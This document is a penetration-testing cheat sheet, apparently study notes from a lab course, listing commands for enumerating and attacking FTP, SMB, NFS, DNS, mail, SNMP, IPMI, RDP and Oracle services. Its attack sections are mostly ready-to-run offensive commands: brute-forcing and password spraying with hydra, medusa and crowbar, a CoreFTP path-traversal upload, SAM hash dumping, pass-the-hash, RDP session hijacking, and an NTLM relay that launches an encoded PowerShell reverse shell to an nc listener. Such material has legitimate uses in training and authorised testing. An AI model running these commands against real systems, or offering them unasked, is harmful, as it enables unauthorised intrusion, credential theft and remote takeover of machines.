# All Commands

### Infrastructure-based Enumeration

| **Command**                                                         | **Description**                              |
| ------------------------------------------------------------------- | -------------------------------------------- |
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency.                    |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done`           | Scan each IP address in a list using Shodan. |

***

### Host-based Enumeration

Tools to interect with Common Services
| **SMB**                                                                                  | **FTP**                                     | **Email**                                          | **Databases**                                                                                                                |
| ---------------------------------------------------------------------------------------- | ------------------------------------------- | -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)          | [ftp](https://linux.die.net/man/1/ftp)      | [Thunderbird](https://www.thunderbird.net/en-US/)  | [mssql-cli](https://github.com/dbcli/mssql-cli)                                                                              |
| [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)                              | [lftp](https://lftp.yar.ru/)                | [Claws](https://www.claws-mail.org/)               | [mycli](https://github.com/dbcli/mycli)                                                                                      |
| [SMBMap](https://github.com/ShawnDEvans/smbmap)                                          | [ncftp](https://www.ncftp.com/)             | [Geary](https://wiki.gnome.org/Apps/Geary)         | [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)                             |
| [Impacket](https://github.com/SecureAuthCorp/impacket)                                   | [filezilla](https://filezilla-project.org/) | [MailSpring](https://getmailspring.com)            | [dbeaver](https://github.com/dbeaver/dbeaver)                                                                                |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)   | [crossftp](http://www.crossftp.com/)        | [mutt](http://www.mutt.org/)                       | [MySQL Workbench](https://dev.mysql.com/downloads/workbench/)                                                                |
| [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) |                                             | [mailutils](https://mailutils.org/)                | [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) |
|                                                                                          |                                             | [sendEmail](https://github.com/mogaal/sendemail)   |                                                                                                                              |
|                                                                                          |                                             | [swaks](http://www.jetmore.org/john/code/swaks/)   |                                                                                                                              |
|                                                                                          |                                             | [sendmail](https://en.wikipedia.org/wiki/Sendmail) |                                                                                                                              |

## FTP

| **Command**                                               | **Description**                                                         |
| --------------------------------------------------------- | ----------------------------------------------------------------------- |
| `ftp <FQDN/IP> ; debug; trace`                                           | Interact with the FTP service on the target.                            |
| `cat /etc/ftpusers`                                           | FTP users                                                           |
| `wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136`                                           | Download all available files                                                           |
| `https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes`                       | FTP return codes                            |
| `sudo nmap --script-updatedb; find / -type f -name ftp* 2>/dev/null \| grep scripts ; sudo nmap -sV -p21 -sC -A 10.129.14.136; sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace`                       | Nmap FTP Scripts                           |
| `nc -nv <FQDN/IP> 21`                                     | Interact with the FTP service on the target.                            |
| `telnet <FQDN/IP> 21`                                     | Interact with the FTP service on the target.                            |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp`    | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server.                  |
| `https://security.appspot.com/vsftpd.html; VSFTPD.CONF-> http://vsftpd.beasts.org/vsftpd_conf.html` | One of the most used FTP servers on Linux-based distributions is vsFTPd -> /etc/vsftpd.conf                 |

#### Attack FTP
Anonymous Authentication
`ftp 192.168.2.142 ; anonymous ; get, mget, put, help`

Brute-Force with Medusa - but password spraying is more effective
`medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp`

`hydra -t 45 -L users.list -P passwords.list ssh://STMIP -q`

[FTP Bounce attack](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)
`nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2`

CoreFTP Exploitation
`curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops` 

target `C:\> type C:\whoops`

[FTP bounce attack](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)
`nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2`

## SMB

| **Command**                                       | **Description**                                           |
| ------------------------------------------------- | --------------------------------------------------------- |
| `sudo nmap 10.129.14.128 -sV -sC -p139,445`                     | SMB Enumeration.                       |
| `smbclient -N -L //<FQDN/IP> ; smb status`                     | Null session authentication on SMB.                       |
| `smbmap -H 10.129.14.128> ; also we can add -r NameOffile`                     | SMB Enumeration.                     |
| `smbclient -U jason //10.129.137.91/GGJ`                     | SMB login and get file.                     |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"`                     | SMB download file.                     |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`                     | SMB upload the file.                     |
| [SMB uses TCP](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/%5bMS-SMB2%5d.pdf#%5B%7B%22num%22%3A920%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C69%2C738%2C0%5D)                     |                        |
|[CIFS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/934c2faa-54af-4526-ac74-6a24d126724e)                  |  CIFS is the extension of the SMB protocol. So when we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over TCP ports 137, 138, 139, but CIFS uses TCP port 445 only                           |
| [NETBIOS](https://networkencyclopedia.com/netbios-name-server-nbns/)                   | [WINS](https://networkencyclopedia.com/windows-internet-name-service-wins/)                         |
| `cat /etc/samba/smb.conf \| grep -v "#\\|\;" `                   | Default configuration.                          |
| `rpcclient -U "" <FQDN/IP>`                       | Interaction with the target using RPC. The Remote Procedure Call (RPC) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value.                    |

[RPC cheatsheets](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)

RPC login
```
rpcclient -U'%' 10.10.110.17
rpcclient $> enumdomusers
```

| rpc Query                    | Description                                                        |
|--------------------------|--------------------------------------------------------------------|
| srvinfo                  | Server information.                                                |
| enumdomains              | Enumerate all domains that are deployed in the network.            |
| querydominfo             | Provides domain, server, and user information of deployed domains. |
| netshareenumall          | Enumerates all available shares.                                   |
| netsharegetinfo <share>  | Provides information about a specific share.                       |
| enumdomusers             | Enumerates all domain users.                                       |
| queryuser <RID>          | Provides information about a specific user.                        |

| **Command**                                       | **Description**                                           |
| ------------------------------------------------- | --------------------------------------------------------- |
| `for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" \| grep "User Name\\|user_rid\\|group_rid" && echo "";done`                       | Brute forcing user RID                 |
| `sudo nmap 10.129.14.128 -sV -sC -p139,445`                       | Footprinting the Service with NMAP                   || 
| `samrdump.py <FQDN/IP>`                           | Username enumeration using Impacket scripts.              |
| `smbmap -H <FQDN/IP>`                             | Enumerating SMB shares.                                   |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A`                   | SMB enumeration using enum4linux.                         |

#### Attack SMB with Metasploit
```
msfconsole -q
use auxiliary/scanner/smb/smb_login
set rhosts HOSTIP
set SMBUSER jason
set PASS_FILE ./pws.list
set stop_on_success true
run
```

#### Attack SMB
Enum4linux is another utility that supports null sessions, and it utilizes nmblookup, net, rpcclient, and smbclient to automate some common enumeration from SMB targets. Using the --continue-on-success flag will continue spraying even after a valid password is found. Additionally, if we are targetting a non-domain joined computer, we will need to use the option --local-auth
`./enum4linux-ng.py 10.10.11.45 -A -C`

1. Password spraying with crackmapexec
`crackmapexec smb 10.10.110.17 -u /tmp/someuserlist.txt -p 'Company01!' --local-auth`

2. Impacket-psexec
`impacket-psexec administrator:'Password123!'@10.10.110.17`

3. CrackMapExec
`crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`
 If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec

Enumerating Logged-on Users
`crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`

Extract Hashes from SAM Database
`crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`

Pass-the-Hash (PtH)
`crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`

4. [Responder](https://github.com/lgandx/Responder)
`responder -I <interface name>`
` hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`

If we cannot crack the NTLM2 hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py.
First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
1. ` cat /etc/responder/Responder.conf | grep 'SMB ='`
2. `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
3. ` impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e 'base64 hash from revshells'`
4. `nc -lvnp 9001`

## NFS 

| Option            | Description                                                                                                                               |
|-------------------|-------------------------------------------------------------------------------------------------------------------------------------------|
| rw                | Read and write permissions.                                                                                                               |
| ro                | Read only permissions.                                                                                                                    |
| sync              | Synchronous data transfer. (A bit slower)                                                                                                 |
| async             | Asynchronous data transfer. (A bit faster)                                                                                                |
| secure            | Ports above 1024 will not be used.                                                                                                        |
| insecure          | Ports above 1024 will be used.                                                                                                            |
| no_subtree_check  | This option disables the checking of subdirectory trees.                                                                                  |
| root_squash       | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount. |


| **Command**                                               | **Description**                                  |
| --------------------------------------------------------- | ------------------------------------------------ |
| `/etc/exports`                                  | The  file contains a table of physical filesystems on an NFS server accessible by the clients                       |
| `echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports;systemctl restart nfs-kernel-server ; exportfs`                                  | We have shared the folder /mnt/nfs to the subnet 10.129.14.0/24 with the setting shown above. This means that all hosts on the network will be able to mount this NFS share and inspect the contents of this folder.                       |
| `sudo nmap 10.129.14.128 -p111,2049 -sV -sC ; sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049`                                  | Footprinting the Service.                       |
| `showmount -e <FQDN/IP>`                                  | Show available NFS shares.                       |
| `mkdir target-NFS; mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock; cd target-NFS; tree . ; ls -l mnt/nfs/ ; ls -n mnt/nfs/` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS`                                     | Unmount the specific NFS share.                  |

## DNS

| **Command**                                                                                                   | **Description**                          |
| ------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `dig ns <domain.tld> @<nameserver>`                                                                           | NS request to the specific nameserver.   |
| `dig any <domain.tld> @<nameserver>`                                                                          | ANY request to the specific nameserver.  |
| `dig axfr <domain.tld> @<nameserver>`                                                                         | AXFR request to the specific nameserver. |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing.                 |

## SMTP

| **Command**           | **Description** |
| --------------------- | --------------- |
| `telnet <FQDN/IP> 25` |                 |

## IMAP/POP3

| **Command**                                            | **Description**                         |
| ------------------------------------------------------ | --------------------------------------- |
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps`            | Connect to the IMAPS service.           |
| `openssl s_client -connect <FQDN/IP>:pop3s`            | Connect to the POP3s service.           |

## SNMP

| **Command**                                       | **Description**                                     |
| ------------------------------------------------- | --------------------------------------------------- |
| `snmpwalk -v2c -c <community string> <FQDN/IP>`   | Querying OIDs using snmpwalk.                       |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*`          | Bruteforcing SNMP service OIDs.                     |


## IPMI

| **Command**                                    | **Description**         |
| ---------------------------------------------- | ----------------------- |
| `msf6 auxiliary(scanner/ipmi/ipmi_version)`    | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes.       |

## Linux Remote Management

| **Command**                                                 | **Description**                                       |
| ----------------------------------------------------------- | ----------------------------------------------------- |
| `ssh-audit.py <FQDN/IP>`                                    | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>`                                      | Log in to the SSH server using the SSH client.        |
| `ssh -i private.key <user>@<FQDN/IP>`                       | Log in to the SSH server using private key.           |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication.                |

## Windows Remote Management

| **Command**                                                   | **Description**                                 |
| ------------------------------------------------------------- | ----------------------------------------------- |
| `rdp-sec-check.pl <FQDN/IP>`                                  | Check the security settings of the RDP service. |
| `rdesktop -u admin -p password123 192.168.2.143`              | RDP login                                       |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>`             | Log in to the RDP server from Linux.            |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>`             | Log in to the WinRM server.                     |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service.          |


#### Attack RDP

Enumeration `nmap -Pn -p3389 192.168.2.143`

[crowbar - RDP password spraying](https://github.com/galkan/crowbar)
`crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`

Hydra
`hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`

RDP Session Hijacking (we need to have SYSTEM privileges)
[tscon](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon)
`query user`
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

`xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9`

 


## Oracle TNS

| **Command**                                                                                                          | **Description**                                                                                         |
| -------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| `./odat.py all -s <FQDN/IP>`                                                                                         | Perform a variety of scans to gather information about the Oracle database services and its components. |
| `sqlplus <user>/<pass>@<FQDN/IP>/<db>`                                                                               | Log in to the Oracle database.                                                                          |
| `./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` | Upload a file with Oracle RDBMS.                                                                        |
